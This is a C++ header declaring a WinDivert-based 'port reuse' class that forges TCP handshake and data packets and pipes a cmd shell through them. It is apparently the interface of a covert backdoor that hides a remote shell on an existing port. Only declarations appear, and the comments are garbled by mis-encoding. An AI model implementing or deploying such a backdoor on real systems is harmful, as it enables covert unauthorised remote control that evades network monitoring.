#pragma once
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <process.h>
#include "windivert.h"

using namespace std;

class CPortReuse
{
private:
	UINT8* m_packet_template;
	UINT m_template_packet_len;
	WINDIVERT_ADDRESS* m_addr_template;
	HANDLE m_divert_handle;

	// shell�ùܵ��ṹ��
	HANDLE m_std_in_rd = NULL;
	HANDLE m_std_in_wr = NULL;
	HANDLE m_std_out_rd = NULL;
	HANDLE m_std_out_wr = NULL;
	PROCESS_INFORMATION m_proc_info;
	HANDLE m_read_thread = NULL; 
	unsigned m_thread_id;

public:
	CPortReuse();
	~CPortReuse();
	void start();

private:
	void get_packet_template(UINT8* packet, UINT recv_len);								// ��ʽ����׼���Ͱ�
	void get_addr_template(PWINDIVERT_ADDRESS addr);
	void send_response_packet(UINT8* packet, UINT recv_len);							// ����ȷ�հ�
	void send_data_packet(const char* payload_buf);										// �������ݰ�
	BOOL init_divert(const char* filter);												// ��ʼ��windivert
	void run_shell();																	// ��shell
	void exit_shell();																	// �˳�shell
	void add_seq(UINT seq);																// ��ӱ�׼����seq
	void send_connect_reponse(UINT8* packet, UINT recv_len);								// ģ��tcp��������
	static unsigned WINAPI read_from_cmd(void* ptr);									// ��ȡcmd����߳�
};